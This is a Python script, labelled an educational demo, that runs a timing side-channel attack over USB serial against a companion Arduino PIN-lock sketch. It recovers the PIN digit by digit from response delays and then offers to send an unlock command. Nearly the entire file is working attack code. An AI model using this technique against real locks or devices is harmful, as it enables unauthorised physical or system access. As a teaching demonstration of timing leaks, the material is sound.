"""Timing side-channel attack against the companion Arduino PIN lock.

This script drives `arduino_lock_demo.ino` over the USB serial port. The
sketch's `checkPin()` early-exits on the first mismatching digit and inserts
a small delay between successful character comparisons, so the round-trip
time leaks how many leading digits of the guess match the secret PIN.

The attack recovers the PIN one position at a time:

    1. Hold the already-recovered prefix fixed.
    2. Try every candidate digit at the next position (the rest is padded
       with zeros, the value does not matter).
    3. The candidate with the largest measured response time is the one
       that pushed the comparison one character deeper -- that is the
       correct digit for this position.
    4. If the device ever answers ``RESULT:SUCCESS`` we are done early.

Usage:
    python timing_attack_first_demo.py [--port /dev/ttyACM0] [--baud 9600]

Educational use only.
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import List, Tuple

import serial

# --- Defaults -----------------------------------------------------------------
DEFAULT_SERIAL_PORT = "/dev/ttyACM0"
DEFAULT_BAUD_RATE = 9600
PIN_LENGTH = 4
POSSIBLE_DIGITS = "0123456789ABCD*#"
# Cool-down between attempts. The Arduino blinks its red LED for ~400 ms on a
# failure, which would otherwise overlap with our next probe and skew timings.
COOLDOWN_DELAY = 0.45


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"


def print_banner() -> None:
    banner = rf"""{Colors.BLUE}
    SIDE-CHANNEL TIMING EXPLOIT
     || educational demo ||
    {Colors.RESET}"""
    print(banner)


def test_pin(ser: serial.Serial, pin_guess: str) -> Tuple[float, str]:
    """Send a 4-character guess and time the device's response."""
    ser.reset_input_buffer()
    payload = pin_guess + "\n"

    start_time = time.perf_counter()
    ser.write(payload.encode("utf-8"))
    response = ser.readline().decode("utf-8").strip()
    end_time = time.perf_counter()

    duration = end_time - start_time
    time.sleep(COOLDOWN_DELAY)
    return duration, response


def print_results_table(
    results: List[Tuple[str, str, float, float]],
    highlight_digit: str,
    highlight_marker: str,
    highlight_color: str = Colors.CYAN,
) -> None:
    for r_digit, r_guess, r_dur, r_delta in results:
        if r_digit == highlight_digit:
            color = highlight_color
            marker = highlight_marker
        else:
            color = Colors.RESET
            marker = ""
        delta_str = f"+{r_delta:.5f}" if r_delta >= 0 else f"{r_delta:.5f}"
        print(
            f"{color}  {r_digit:^5} | {r_guess:^12} | {r_dur:.5f}       | "
            f"{delta_str} {marker}{Colors.RESET}"
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--port", default=DEFAULT_SERIAL_PORT,
                        help=f"serial port (default: {DEFAULT_SERIAL_PORT})")
    parser.add_argument("--baud", type=int, default=DEFAULT_BAUD_RATE,
                        help=f"baud rate (default: {DEFAULT_BAUD_RATE})")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    print_banner()
    print(f"[*] Initializing serial uplink on {args.port}...")

    try:
        ser = serial.Serial(args.port, args.baud, timeout=2)
        time.sleep(2)  # Wait for the Arduino auto-reset to finish
        ser.reset_input_buffer()
        print(f"{Colors.GREEN}[+] Uplink established. Target acquired.{Colors.RESET}\n")
    except Exception as e:
        print(f"{Colors.RED}[!] Link failure: {e}{Colors.RESET}")
        sys.exit(1)

    print("[*] Analyzing target architecture...")
    print(f"[*] Identified PIN length: {PIN_LENGTH}")
    print(f"[*] Rate Limit Detected: Applying {COOLDOWN_DELAY}s bypass delay.\n")

    input(f"{Colors.YELLOW}[?] Press ENTER to initiate timing attack...{Colors.RESET}")
    print(f"\n{Colors.RED}[!] COMMENCING ATTACK PHASE{Colors.RESET}\n")

    cracked_pin = ""

    for position in range(PIN_LENGTH):
        print(f"{Colors.BLUE}=== Scanning Position {position + 1} ==={Colors.RESET}")
        print("  Guess | Target Input | Exec Time (s) | Delta ")
        print("  ------|--------------|---------------|-------")

        max_time = 0.0
        best_digit = "0"
        baseline_time: float | None = None
        results: List[Tuple[str, str, float, float]] = []

        for digit in POSSIBLE_DIGITS:
            padding = "0" * (PIN_LENGTH - len(cracked_pin) - 1)
            current_guess = cracked_pin + digit + padding

            duration, response = test_pin(ser, current_guess)

            if baseline_time is None:
                baseline_time = duration
            delta = duration - baseline_time
            results.append((digit, current_guess, duration, delta))

            # Lucky path: we tripped SUCCESS before exhausting candidates.
            if "SUCCESS" in response:
                cracked_pin += digit
                print_results_table(results, digit, "<-- ACCESS GRANTED")
                print(f"\n{Colors.GREEN}  [!] Guess '{digit}' -> SUCCESS RESPONSE DETECTED!{Colors.RESET}")
                print(f"\n{Colors.GREEN}[!!!] TARGET BREACHED! PIN IS: {cracked_pin}{Colors.RESET}")

                open_door = input(
                    f"\n{Colors.YELLOW}[?] Execute remote unlock sequence? (Y/N): {Colors.RESET}"
                )
                if open_door.lower() == "y":
                    ser.reset_input_buffer()
                    ser.write((cracked_pin + "\n").encode("utf-8"))
                    print(f"{Colors.GREEN}[+] Payload sent. Door unlocked.{Colors.RESET}")

                ser.close()
                return

            if duration > max_time:
                max_time = duration
                best_digit = digit

        print_results_table(results, best_digit, "<-- ANOMALY")
        cracked_pin += best_digit
        print(f"\n{Colors.GREEN}[+] Position {position + 1} Locked: '{best_digit}'{Colors.RESET}")
        print(f"[*] Current Key: {cracked_pin}\n")

    print(f"{Colors.MAGENTA}======================================{Colors.RESET}")
    print(f"{Colors.GREEN}[*] EXPLOIT COMPLETE. FINAL KEY: {cracked_pin}{Colors.RESET}")
    print(f"{Colors.MAGENTA}======================================{Colors.RESET}\n")

    open_door = input(
        f"{Colors.YELLOW}[?] Execute remote unlock sequence with key {cracked_pin}? (Y/N): {Colors.RESET}"
    )
    if open_door.lower() == "y":
        ser.reset_input_buffer()
        ser.write((cracked_pin + "\n").encode("utf-8"))
        print(
            f"{Colors.GREEN}[+] Target response: "
            f"{ser.readline().decode('utf-8').strip()}{Colors.RESET}"
        )

    ser.close()


if __name__ == "__main__":
    main()
